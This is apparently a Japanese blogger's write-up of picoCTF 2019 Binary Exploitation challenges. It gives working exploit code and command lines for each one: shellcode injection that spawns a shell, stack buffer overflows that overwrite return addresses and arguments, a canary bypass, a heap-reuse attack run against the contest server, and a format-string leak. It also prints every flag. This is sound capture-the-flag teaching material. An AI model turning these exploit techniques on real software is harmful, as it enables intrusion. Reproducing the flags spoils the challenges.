---
title: "picoCTF 2019 Writeup"
date: 2019-10-12T07:45:00+09:00
lastmod: 2019-10-12T07:45:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: "きゃぷあめ"
---
URL: [https://2019game.picoctf.com/](https://2019game.picoctf.com/)
<br /><br />
お疲れ様でした！ （実際、ほんとに疲れた）
<br /><br />
PwnとWeb系があんまりできてないけど、スコアも切りのいい20000に行ったし、Globalで目標の300位以内にも入れたのでかなり満足です。

<br /><br />
最終結果は、こんな感じ。

<img src="https://captureamerica.github.io/writeups/img/pico2019_Score.png" alt="pico2019_Score.png">

<img src="https://captureamerica.github.io/writeups/img/pico2019_Rank.png" alt="pico2019_Rank.png">

2週間の間、土日もずっとピコってたし、一日年休も取って頑張りましたよ〜

去年出た問題に似てるものも結構あったので、picoCTF 2018をそれなりにやった人は結構アドバンテージがあったと思います。



<br /><br />
それでは、Writeupです。数が多いので、コツコツ追記していきます。
<br /><br />




<br /><br />
# [Binary Exploitation]: handy-shellcode (50 points)
- - -
## Challenge
> This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt?
<br /><br />
Hint: You might be able to find some good shellcode online.

Attachment:

- vuln (ELF 32-bit)
- vuln.c

<br />
## Solution
これは、picoCTF 2018のshellcodeと同じでした。

```Python
#!/usr/bin/env python
from pwn import *

sh = process('./vuln')

sh.sendlineafter('Enter your shellcode:\n', asm(shellcraft.i386.linux.sh()))
sh.interactive()
```

Flag: `picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}`



<br /><br />
<br /><br />
# [Binary Exploitation]: OverFlow 1 (150 points)
- - -
## Challenge
> You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program?
<br /><br />
Hint: Take control that return address
<br />
Hint: Make sure your address is in Little Endian.

Attachment:

- vuln (ELF 32-bit)
- vuln.c

<br />
## Solution
offsetを求めて、飛びたい関数に飛ぶだけ。

```
$ (python -c 'print("A"*76+"\xE6\x85\x04\x08")' ; cat - ) | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn57f5688e7}
```

Flag: `picoCTF{n0w_w3r3_ChaNg1ng_r3tURn57f5688e7}`




<br /><br />
<br /><br />
# [Binary Exploitation]: NewOverFlow-1 (200 points)
- - -
## Challenge
> Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program.
<br /><br />
Hint: Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes

Attachment:

- vuln (ELF 64-bit)
- vuln.c

<br />
## Solution
picoCTFのサーバは、Ubuntu 18.04であるところがポイントです。16 byte alignmentしないと解けません。


```Python
#!/usr/bin/env python
from pwn import *

if 1:
    s=ssh(host='2019shell1.picoctf.com', user='', password='')
    s.set_working_directory('/problems/newoverflow-1_3_e53f871ba121b62d35646880e2577f89')
    p=s.process('./vuln')

ret = 0x00000000004005de

payload = ''
payload += b'A' * 64
payload += b'B' * 8
payload += p64(ret)  # for stack alignment
payload += p64(0x0000000000400767)  # flag()

p.sendlineafter("flag: \n", payload)
print p.recvall()
```

Flag: `picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_bfd48203}`



<br /><br />
<br /><br />
# [Binary Exploitation]: NewOverFlow-2 (250 points)
- - -
## Challenge
> Okay now lets try mainpulating arguments. program.
<br /><br />
Hint: Arguments aren't stored on the stack anymore ;)

Attachment:

- vuln (ELF 64-bit)
- vuln.c

<br />
## Solution
たぶん問題が間違っている気がします。win_fn1()とかいくつか関数が追加されているものの、flag()が残っているので、NewOverFlow-1と全く同じで解けます。


Flag: `picoCTF{r0p_1t_d0nT_st0p_1t_e51a1ea0}`




<br /><br />
<br /><br />
# [Binary Exploitation]: OverFlow 2 (250 points)
- - -
## Challenge
> Now try overwriting arguments. Can you get the flag from this program?
<br /><br />
Hint: GDB can print the stack after you send arguments

Attachment:

- vuln (ELF 32-bit)
- vuln.c

<br />
## Solution
これはpicoCTF 2018のbof2とほぼ同じです。

```
$ (python -c 'print("A"*188+"\xe6\x85\x04\x08"+"BBBB"+"\xEF\xBE\xAD\xDE"+"\x0D\xD0\xDE\xC0")'; cat -) | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBﾭ?
picoCTF{arg5_and_r3turn55897b905}
```

Flag: `picoCTF{arg5_and_r3turn55897b905}`




<br /><br />
<br /><br />
# [Binary Exploitation]: CanaRy (300 points)
- - -
## Challenge
> This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this program located in /problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0.
<br /><br />
Hint: Maybe there's a smart way to brute-force the canary?

Attachment:

- vuln (ELF 32-bit)
- vuln.c

<br />
## Solution
これはpicoCTF 2018のbof3とほぼ同じです。

去年のどこかのWriteupにあったコードを流用させてもらって、canary (33xO) をゲット。

```
$ (python -c 'print("54\n"+"A"*32+"33xO"+"abcdefghijklmnop" + "\xed\x07")'; cat -) | ./vuln
Please enter the length of the entry:
> Input> Ok... Now Where's the Flag?
picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}
```

Flag: `picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}`




<br /><br />
<br /><br />
# [Binary Exploitation]: messy-malloc (300 points)
- - -
## Challenge
> Can you take advantage of misused malloc calls to leak the secret through this service and get the flag? Connect with nc 2019shell1.picoctf.com 21899.
<br /><br />
Hint: If only the program used calloc to zero out the memory..

Attachment:

- auth (ELF 64-bit)
- auth.c

<br />
## Solution
GDBを使ってヒープがどうなるか見ながら解析しました。Ubuntu 18.04で解析したら、やっぱりちょっと動きが違った覚えがあります。

あと、recvuntil()辺りが思ったように動かなくて Invalid option になっちゃったりしたので、よくわかんないけど Invalid になった際には再トライするようにして対処しました。

```Python
#!/usr/bin/env python
from pwn import *
import re

# s=process('./auth')
s = remote('2019shell1.picoctf.com', 21899)
    
print s.recvuntil("> ") # Enter you command:
s.sendline("login")
print "## login"

print s.recvuntil("\n") # Please enter the length of your username
s.sendline("25")
print "## 25"

print s.recvuntil("\n") # Please enter your username
data = b'A' * 8 + '\x52\x4f\x4f\x54\x5f\x41\x43\x43' + '\x45\x53\x53\x5f\x43\x4f\x44\x45'
s.sendline(data)

print s.recvuntil("> ") # Enter you command:
s.sendline("logout")
print "## logout"

msg = s.recvuntil("> ") # Enter you command:
print msg
if re.findall("Invalid",msg):
    print s.recvuntil("> ") # Enter you command:
    s.sendline("logout")
    print "## logout"
    print s.recvuntil("> ") # Enter you command:
    s.sendline("login")
    print "## login"
else:
    s.sendline("login")
    print "## login"

print s.recvuntil("\n") # Please enter the length of your username
s.sendline("5")
print "## 5"

print s.recvuntil("\n") # Please enter your username
s.sendline("root")
print "## root"

print s.recvuntil("> ") # Enter you command:
s.sendline("print-flag")
print "## print-flag"

print s.recvuntil("> ") # Enter you command:
s.sendline("print-flag")
print "## print-flag"

print s.recv()
```

Flag: `picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_ac0e0e6a}`





<br /><br />
<br /><br />
# [Binary Exploitation]: stringzz (300 points)
- - -
## Challenge
> Use a format string to pwn this program and get a flag.
<br /><br />
Hint: http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf

Attachment:

- vuln (ELF 32-bit)
- vuln.c

<br />
## Solution
書式文字列攻撃の問題です。

```Python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
context.log_level = 'critical'

for i in range(1,100):
    try:
        s = process('./vuln')
        print i,
        s.recvuntil('back:\n\n')
        s.sendline('%' +str(i)+ '$s')
        response = s.recv()
        print response
        if ( 'picoCTF' in response ):
            print "Found!!!"
            exit()
        s.close()
        sleep(1)
    except:
        print error
        sleep(1)        
```

<br />
37番目に出てくるので、%37$s 入れるだけでもフラグは取れます。
```
$ ./vuln 
input whatever string you want; then it will be printed back:

%37$s
Now 
your input 
will be printed:

picoCTF{str1nG_CH3353_159c98a8}
```

Flag: `picoCTF{str1nG_CH3353_159c98a8}`




<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

